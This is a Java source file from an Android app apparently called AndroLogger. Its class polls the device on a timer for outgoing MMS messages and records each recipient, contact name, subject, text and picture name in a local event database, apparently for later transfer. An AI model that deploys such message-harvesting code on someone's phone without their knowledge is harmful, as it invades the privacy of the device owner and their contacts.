package com.andrologger;
/**
 * MMSOutgoingWatcher.java
 *
 * @author Pradeep Tiwari
 */

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;

/** This class detects new outgoing MMS messages. **/
public class MMSOutgoingWatcher extends BroadcastReceiver {
    // Initialize constants and variables
    public static final String TAG = "OutgoingMMSWatcher";
    public static long COLLECTION_INTERVAL = 1000 * 60 * 60;
    private Context context;

    /**
     * This method sets the collection interval.
     *
     * @param interval Collection interval.
     */
    public void setInterval(long mmsInterval) {
        COLLECTION_INTERVAL = mmsInterval;
    }

    /**
     * This method handles the broadcasted alarm intent.
     *
     * @param context The application's context.
     * @param intent The broadcasted intent.
     */
    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        queryMMSLog();
    }

    /**
     * This method fetches outgoing MMS messages since a given time.
     */
    private void queryMMSLog() {
        // Get oldest time to start collecting MMS messages
        long epochMillis = -1;
        long transferTime = TransferManager.getMostRecentCompletedTransferTime(context);
        if (transferTime == -1) {
            // Find epoch time at midnight of yesterday (if last transfer time is not available)
            Calendar cal = Calendar.getInstance();
            cal.add(Calendar.DATE, -1);
            cal.clear(Calendar.HOUR);
            cal.clear(Calendar.MINUTE);
            cal.clear(Calendar.SECOND);
            cal.clear(Calendar.MILLISECOND);
            epochMillis = cal.getTimeInMillis();
        } else
            epochMillis = transferTime * 1000L;
        long epochSeconds = epochMillis / 1000L;
        // Put found MMS messages in an array
        ArrayList<MMS> mmsArray = MMS.getMMSOutgoingMessages(context, epochSeconds, TAG);
        mmsArray = MMS.addMMSPictureNames(context, mmsArray, TAG);
        mmsArray = MMS.addAddresses(context, mmsArray, TAG);
        mmsArray = MMS.addMMSText(context, mmsArray, TAG);
        // Process MMS message found
        for (MMS mms : mmsArray) {
            String address = mms.getAddress();
            String displayName = ContactFinder.findContact(context, address);
            int messageID = mms.getId();
            Date date = mms.getDate();
            String picName = mms.getPicName();
            String subject = mms.getSubject();
            String text = mms.getText();
            // Substitute text indication place-holders (could not retrieve actual text)
            if (text == null)
                text = "<No Text Included>";
            if (text.equals(""))
                text = "<Text Detected>";
            // Prepare to query AndroLogger content provider to check for duplicate events
            Uri eventsUri = AndroLoggerProvider.Events.CONTENT_URI;
            String[] projection = new String[]{AndroLoggerDatabase.DETECTOR_COLUMN, AndroLoggerDatabase.ADDITIONAL_INFO_COLUMN};
            String selection = AndroLoggerDatabase.DETECTOR_COLUMN + " = ? AND " + AndroLoggerDatabase.ADDITIONAL_INFO_COLUMN + " LIKE ?";
            String[] selectionArgs = new String[]{TAG, "%MSG_ID:" + messageID + ";%"};
            Cursor cursor = null;
            try {
                cursor = context.getContentResolver().query(eventsUri, projection, selection, selectionArgs, null);
            } catch (Exception e) {
                Log.e(TAG, "Unable to query events table");
                return;
            }
            if (cursor == null) {
                Log.e(TAG, "Unable to query events table");
                return;
            }
            if (cursor.getCount() == 0) {
                // Insert new MMS message into AndroLogger
                ContentValues values = new ContentValues();
                values.put(AndroLoggerDatabase.DETECTOR_COLUMN, TAG);
                values.put(AndroLoggerDatabase.EVENT_ACTION_COLUMN, "MMS Sent");
                values.put(AndroLoggerDatabase.EVENT_DATE_COLUMN, date.getTime());
                values.put(AndroLoggerDatabase.EVENT_DESCRIPTION_COLUMN, picName);
                values.put(AndroLoggerDatabase.ADDITIONAL_INFO_COLUMN, "MSG_ID:" + messageID + "; ReceiverAddress:" + address + "; ReceiverContact:" + displayName + "; Subject:" + subject + "; Text:" + text + ";");
                context.getContentResolver().insert(eventsUri, values);
                //Log.i(TAG, "Dir: "+mms.getDirection()+" Address: "+address+" Name: "+displayName+" Sub: "+subject+" Text: "+text+" Pic: "+picName+ " Date: "+date.toString()+" MessageID: "+messageID+" ThreadID: "+mms.getThreadId());
            }
        }
    }

    /**
     * This method sets a new alarm.
     *
     * @param context
     * @param am
     */
    public void setAlarm(Context context, AlarmManager am) {
        if (COLLECTION_INTERVAL <= 0)
            return;
        Intent mmsIntent = new Intent(context, MMSOutgoingWatcher.class);
        PendingIntent pi = PendingIntent.getBroadcast(context, 0, mmsIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), COLLECTION_INTERVAL, pi);
    }

    /**
     * This method cancels existing alarm.
     *
     * @param context
     * @param am
     */
    public void cancelAlarm(Context context, AlarmManager am) {
        if (COLLECTION_INTERVAL <= 0)
            return;
        Intent mmsIntent = new Intent(context, MMSOutgoingWatcher.class);
        PendingIntent sender = PendingIntent.getBroadcast(context, 0, mmsIntent, PendingIntent.FLAG_CANCEL_CURRENT);
        am.cancel(sender);
    }
}




